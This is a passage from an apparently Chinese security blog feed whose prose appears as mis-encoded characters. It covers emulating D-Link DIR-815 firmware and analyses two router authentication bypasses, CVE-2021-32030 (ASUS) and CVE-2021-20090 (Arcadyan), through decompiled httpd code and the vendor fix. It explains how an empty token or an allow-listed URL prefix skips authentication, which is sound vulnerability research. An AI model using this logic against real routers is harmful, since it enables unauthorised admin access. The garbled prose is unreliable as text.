class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è®¾å¤‡çš„ web æœåŠ¡è¢«ç»‘å®šåœ¨ br0 ç½‘å¡ä¸Šï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå°† web æœåŠ¡ç»‘å®šåœ¨ eth0 ç½‘å¡ï¼Œç›‘å¬åœ°å€ 0.0.0.0:80ã€‚</p>
<p>ä¿®æ”¹ images&#x2F;1.tar.gz åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª fake.confï¼Œå†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog /dev/console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">	NumConnections 15</span><br><span class="line">	BufSize 12288</span><br><span class="line">	InputBufSize 4096</span><br><span class="line">	ScriptBufSize 4096</span><br><span class="line">	NumHeaders 100</span><br><span class="line">	Timeout 60</span><br><span class="line">	ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">	Types</span><br><span class="line">	&#123;</span><br><span class="line">		text/html	&#123; html htm &#125;</span><br><span class="line">		text/xml	&#123; xml &#125;</span><br><span class="line">		text/plain	&#123; txt &#125;</span><br><span class="line">		image/gif	&#123; gif &#125;</span><br><span class="line">		image/jpeg	&#123; jpg &#125;</span><br><span class="line">		text/css	&#123; css &#125;</span><br><span class="line">		application/octet-stream &#123; * &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Specials</span><br><span class="line">	&#123;</span><br><span class="line">		Dump		&#123; /dump &#125;</span><br><span class="line">		CGI			&#123; cgi &#125;</span><br><span class="line">		Imagemap	&#123; map &#125;</span><br><span class="line">		Redirect	&#123; url &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	External</span><br><span class="line">	&#123;</span><br><span class="line">		/usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Address 0.0.0.0</span><br><span class="line">	Port 80</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/web</span><br><span class="line">			IndexNames &#123; index.php &#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; txt &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">				/usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">           Alias /smart404</span><br><span class="line">           Location /htdocs/smart404</span><br><span class="line">        &#125;</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /HNAP1</span><br><span class="line">			Location /htdocs/HNAP1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			IndexNames &#123; index.hnap &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Port 1900</span><br><span class="line">	Address 239.255.255.250</span><br><span class="line">	Datagrams On</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/htdocs/upnp/ssdpcgi &#123; * &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, UPnP/1.0, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Address 0.0.0.0</span><br><span class="line">	Port 49152</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹åé‡æ–°åˆ¶ä½œé•œåƒï¼Œå¹¶å¯åŠ¨è™šæ‹Ÿæœºã€‚</p>
<p>å¯åŠ¨åå¯ä»¥åœ¨æ ¹ç›®å½•ä¸‹çœ‹åˆ° fake.confï¼Œå…ˆ kill æ‰ httpd æœåŠ¡ï¼Œä¹‹åä»¥æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶é‡æ–°å¯åŠ¨ httpdã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill 2107</span><br><span class="line">httpd -f /fake.conf</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨ httpd åå¯çœ‹åˆ°å®ƒè¢«ç»‘å®šåœ¨ 0.0.0.0:80</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:49152           0.0.0.0:*               LISTEN      3858/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3858/httpd</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶ä»å®¿ä¸»æœºè®¿é—® web æœåŠ¡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/firmadyne3-1.png"
                     
                ></p>
<p>è‡³æ­¤å›ºä»¶æ¨¡æ‹ŸæˆåŠŸã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>IoT è®¾å¤‡ä¸­èº«ä»½éªŒè¯ç»•è¿‡çš„ä¸€äº›æ¼æ´(2)</title>
    <url>/2021/08/13/bypass_auth2/</url>
    <content><![CDATA[<p>CVE-2021-32030 &amp; CVE-2021-20090</p>
<span id="more"></span>

<h2 id="CVE-2021-32030"><a href="#CVE-2021-32030" class="headerlink" title="CVE-2021-32030"></a><strong>CVE-2021-32030</strong></h2><p>2021 å¹´ 5 æœˆï¼Œæ¥è‡ª Atredis çš„å®‰å…¨ç ”ç©¶è€…æŠ«éœ²äº†ä¸€ä¸ªå½±å“å‡ ä¹æ‰€æœ‰ ASUS è·¯ç”±å™¨çš„èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®åˆ°åå°ç®¡ç†æ¥å£ï¼Œç”±äº ASUS è·¯ç”±å™¨åœ¨åå°æä¾›äº†å¼€å¯ ssh çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…åªéœ€ä¿®æ”¹ç®¡ç†å‘˜å¯†ç å¹¶å¼€å¯ ssh å³å¯è·å– root shellã€‚</p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å›ºä»¶ä¸‹è½½é“¾æ¥ï¼š<a class="link"   href="https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip" >https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æˆ‘ä»¬ä»¥ RT-AX56U ä¸ºä¾‹ï¼Œä½¿ç”¨ binwalk å¯¹å›ºä»¶è§£åŒ…(è§£åŒ…ä¹‹åæœ‰å¯èƒ½åªä¼šå¾—åˆ°ä¸€ä¸ª 100000.ubi æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ ubi_reader ç»§ç»­è§£åŒ…)ã€‚è§£åŒ…ååœ¨ &#x2F;usr&#x2F;sbin&#x2F; ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªå«åš httpd çš„ç¨‹åºï¼Œæ­¤ç¨‹åºç”¨äºå¤„ç†ç”¨æˆ·å‘é€çš„ HTTP è¯·æ±‚ã€‚</p>
<p>æˆ‘ä»¬ç”¨ IDA åˆ†æç¨‹åºï¼Œæœç´¢ httpd_handle_request å­—ç¬¦ä¸²å¯æ‰¾åˆ°å¤„ç†è¯·æ±‚çš„å…¥å£ä½ç½®ï¼Œå¦å¤–ï¼Œç”±äº ASUS è·¯ç”±å™¨é‡‡ç”¨äº†ä¸€äº›å¼€æºç»„ä»¶ï¼Œæ ¹æ® GPL è§„åˆ™ï¼ŒASUS åœ¨(æ•°ä¸ªç‰ˆæœ¬ä¹‹å‰)å…¶å®˜ç½‘å‘å¸ƒäº†è·¯ç”±å™¨çš„æºä»£ç ï¼Œå¹¶ä¸”è¡ç”Ÿå‡ºæ¢…æ—ç­‰ä¼˜ç§€çš„å®˜æ”¹ç‰ˆå›ºä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ github ä¸Šæ‰¾åˆ° merlin å›ºä»¶é¡¹ç›®ï¼Œåˆ©ç”¨<a class="link"   href="https://github.com/RMerl/asuswrt-merlin.ng/blob/6b60627c8c9c5c0271e956c914afb5277f81f9c4/release/src/router/httpd/httpd.c" >æºä»£ç <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>è¾…åŠ©åˆ†æã€‚</p>
<p>httpd_handle_request å‡½æ•°é€»è¾‘ç®€è¿°å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆå¯¹è¯·æ±‚è¿›è¡Œç®€å•è§£æï¼Œåˆ©ç”¨ strncasecmp ç­‰å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ä»ç”¨æˆ·è¯·æ±‚ä¸­åŒ¹é…å‡ºä¸€äº›ç»“æ„ï¼Œå¹¶å°†è¿™äº›æ•°æ®èµ‹å€¼åˆ°å¯¹åº”çš„å˜é‡ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strncasecmp(v4, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    stringp = v4 + <span class="number">8</span>;</span><br><span class="line">    v87 = &amp;stringp[<span class="built_in">strspn</span>(stringp, <span class="string">&quot; \t&quot;</span>)];</span><br><span class="line">    stringp = v87;</span><br><span class="line">    v20 = <span class="built_in">strlen</span>(v87);</span><br><span class="line">    v17 = v87;</span><br><span class="line">    v18 = v20 + <span class="number">1</span>;</span><br><span class="line">    LABEL_40:</span><br><span class="line">    v4 = &amp;v17[v18];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¿‡æ»¤ URLï¼Œé˜²æ­¢å‡ºç°è·¯å¾„ç©¿è¶Šã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v28 == <span class="number">47</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(v26, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strncmp</span>(v26, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v26, <span class="string">&quot;/../&quot;</span>)</span><br><span class="line">    || (v30 = <span class="built_in">strcmp</span>(&amp;v26[v29 - <span class="number">3</span>], <span class="string">&quot;/..&quot;</span>)) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v2 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    v3 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    LABEL_60:</span><br><span class="line">    v24 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_5ED20(v24, v3, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åæ ¹æ®ç”¨æˆ·è®¿é—®çš„ URL å’Œ Method æ‰§è¡Œä¸åŒé€»è¾‘ï¼Œä½†æ‰€æœ‰éœ€è¦èº«ä»½éªŒè¯çš„æ¥å£éƒ½è¦ç»è¿‡å‡½æ•° auth_check(sub_5B560)ï¼Œæ­¤å‡½æ•°ä» Cookie ä¸­è·å– asus_token å‚æ•°çš„å€¼ï¼Œç„¶åå¸¦å…¥ sub_59588 è¿›è¡Œæ£€æŸ¥</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_59588</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v2 = nvram_get_1(<span class="string">&quot;ifttt_token&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">761</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token fail.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">767</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(</span><br><span class="line">        <span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token is %s.\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;check_ifttt_token&quot;</span>,</span><br><span class="line">        <span class="number">768</span>,</span><br><span class="line">        a1);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = nvram_get_1(<span class="string">&quot;ifttt_token&quot;</span>);</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] httpd long token is %s.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">769</span>, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬æ³¨æ„åˆ°å‡½æ•°å…ˆä»é…ç½®æ–‡ä»¶ä¸­è·å– ifttt_token å‚æ•°çš„å€¼ï¼Œç„¶åå°† asus_token å’Œå®ƒæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œåˆ™è¾“å‡º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IFTTT/ALEXA long token success.</span><br></pre></td></tr></table></figure></div>

<p>åŒæ—¶è¿”å› 1ï¼Œè¡¨ç¤ºèº«ä»½éªŒè¯é€šè¿‡ã€‚</p>
<p>ä½†æ˜¯åœ¨è®¾å¤‡çš„é»˜è®¤é…ç½®ä¸‹ï¼ŒIFTTT åŠŸèƒ½æ²¡æœ‰å¼€å¯ï¼Œè¿™å¯¼è‡´ ifttt_token é»˜è®¤å€¼ä¸ºç©ºï¼Œ æ­¤æ—¶å¦‚æœç”¨æˆ·ä¼ å…¥çš„ asus_token ä¹Ÿæ˜¯ç©ºå€¼ï¼Œåˆ™ strcmp ä¼šè¿”å› 0 è¡¨ç¤ºæ¯”è¾ƒæˆåŠŸï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡åç»­çš„æ£€æŸ¥ï¼Œå®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p>
<p>æ–°ç‰ˆ auth_check å‡½æ•°å°†ä»£ç ä¿®æ”¹ä¸º</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1 &amp;&amp; *nvram_safe_get_0(<span class="string">&quot;ifttt_token&quot;</span>) &amp;&amp; (v2 = nvram_safe_get_0(<span class="string">&quot;ifttt_token&quot;</span>), !<span class="built_in">strcmp</span>(a1, v2)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        Debug2File(</span><br><span class="line">        <span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;check_ifttt_token&quot;</span>,</span><br><span class="line">        <span class="number">1020</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆåˆ¤æ–­ asus_token æ˜¯å¦ä¸ºç©ºï¼Œé¿å…ç”¨æˆ·ä¼ å…¥ç©ºå€¼çš„æƒ…å†µå‡ºç°ï¼Œä»è€Œä¿®å¤äº†æ­¤æ¼æ´ã€‚</p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a class="link"   href="https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass" >https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="CVE-2021-20090"><a href="#CVE-2021-20090" class="headerlink" title="CVE-2021-20090"></a><strong>CVE-2021-20090</strong></h2><p>2021 å¹´ 4 æœˆï¼ŒTenable å®‰å…¨ç ”ç©¶è€…æŠ«éœ²äº†å½±å“ Arcadyan ç³»åˆ—ç½‘ç»œè®¾å¤‡çš„ä¸€äº›æ¼æ´ï¼Œåç»­ç»ç¡®è®¤ï¼Œæœ‰å¤šä¸ªå‚å•†é‡‡ç”¨äº† Arcadyan å¼€å‘çš„ç³»ç»Ÿå¥—ä»¶ï¼Œä»è€Œé­å—è¿™äº›æ¼æ´çš„å½±å“ã€‚</p>
<h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼ŒArcadyan æä¾›çš„ç»„ä»¶è¢«å¤šä¸ªç½‘ç»œè®¾å¤‡å‚å•†ä½¿ç”¨ï¼Œæˆ‘ä»¬ä»¥ ASUS DSL-AC88U ä¸ºä¾‹è¿›è¡Œåˆ†æã€‚</p>
<p>å›ºä»¶ç‰ˆæœ¬ï¼š1.10.05_Build502ï¼Œä¸‹è½½å binwalk å³å¯è§£åŒ…ã€‚</p>
<p>å…³é”®æ–‡ä»¶ï¼š&#x2F;usr&#x2F;sbin&#x2F;httpd</p>
<p>IDA åŠ è½½åˆ†æï¼Œé¦–å…ˆå¯ä»¥å®šä½åˆ°åä¸º process_request çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºè§£æåçš„ http è¯·æ±‚ç»“æ„ä½“ï¼Œæ­¤å‡½æ•°å…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">url_decode(&amp;req-&gt;url);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%s] url=[%s], args=[%s], method=[%s]\n&quot;</span>, <span class="string">&quot;process_request&quot;</span>, &amp;req-&gt;url, req-&gt;args, req-&gt;method);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">req-&gt;is_url_valid = sub_DEB0(&amp;req-&gt;url);</span><br><span class="line">v7 = *(off_54FAC[<span class="number">0</span>] + <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> ( (!v7 || v7(req) != <span class="number">2</span>) &amp;&amp; (req-&gt;is_url_valid || !check_auth_0(&amp;req-&gt;url, <span class="number">0</span>, req)) )</span><br><span class="line">&#123;</span><br><span class="line">    req-&gt;dword798C = <span class="number">0</span>;</span><br><span class="line">    v8 = req-&gt;method;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;HEAD&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        req-&gt;dword798C = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( req-&gt;dword7988 )</span><br><span class="line">        &#123;</span><br><span class="line">            req-&gt;dword798C = <span class="number">0</span>;</span><br><span class="line">            LOG(req, <span class="number">400</span>, <span class="string">&quot;Invalid HTTP/0.9 method.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_19:</span><br><span class="line">        process_get(req);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">        process_post(req);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        LOG(req, <span class="number">400</span>, <span class="string">&quot;Invalid or unsupported method.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè°ƒç”¨ url_decode å‡½æ•°å¯¹ url è¿›è¡Œè§£ç ï¼Œç„¶åè°ƒç”¨ sub_DEB0 å‡½æ•°å¯¹ url è¿›è¡Œåˆ¤æ–­ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DEB0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> **i; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  v2 = allow_urls[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !allow_urls[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = allow_urls; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(url, v2, v5) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = i[<span class="number">1</span>];</span><br><span class="line">    v2 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä»ä¸€ä¸ª allow_urls åˆ—è¡¨ä¸­è·å–å€¼ï¼Œå†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/images/</span><br><span class="line">/lang/</span><br><span class="line">/js/</span><br><span class="line">/css/</span><br><span class="line">/login.htm</span><br><span class="line">/loginpserr.htm</span><br><span class="line">/relogin.htm</span><br><span class="line">/login.cgi</span><br><span class="line">/cgi/cgi_tel_dect_firmware_upgrade_state.js</span><br><span class="line">/wz_setpwd.cgi</span><br><span class="line">/error_page.htm</span><br><span class="line">/cgi/cgi_clients.js</span><br><span class="line">/blocking.htm</span><br><span class="line">/get_ver.htm</span><br></pre></td></tr></table></figure></div>

<p>å…ˆè·å– allow_urls  ä¸€é¡¹çš„é•¿åº¦ï¼Œç„¶åç”¨ strncasecmp å‡½æ•°å’Œç”¨æˆ·ä¼ å…¥çš„ URL æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰åˆ™è¿”å› 1ï¼Œæ­¤æ—¶ req-&gt;is_url_valid ä¸º 1ã€‚</p>
<p>ä¹‹åå›åˆ° process_request å‡½æ•°ï¼Œåˆ¤æ–­ req-&gt;is_url_valid çš„å€¼ï¼Œå¦‚æœå®ƒç­‰äº 1ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ check_auth_0 å‡½æ•°ï¼Œç›¸å½“äºå½“ç”¨æˆ·è®¿é—®é™æ€èµ„æºæ—¶ï¼Œè‡ªåŠ¨è·³è¿‡èº«ä»½éªŒè¯ã€‚</p>
<p>éšååˆ¤æ–­ methodï¼Œå¦‚æœæ˜¯ POSTï¼Œåˆ™æ‰§è¡Œ process_postã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">process_post</span><span class="params">(struct_req *req)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *url; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  url = &amp;req-&gt;url;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s] path: %s, args: %s\n&quot;</span>, <span class="string">&quot;process_post&quot;</span>, &amp;req-&gt;url, req-&gt;args);</span><br><span class="line">  <span class="keyword">switch</span> ( sub_DF50(url) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      LOG(req, <span class="number">302</span>, url);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !sub_14F9C(req) )</span><br><span class="line">        LOG(req, <span class="number">501</span>, <span class="string">&quot;POST to non-script&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      exec_cgi_script(req);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      LOG(req, <span class="number">400</span>, url);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

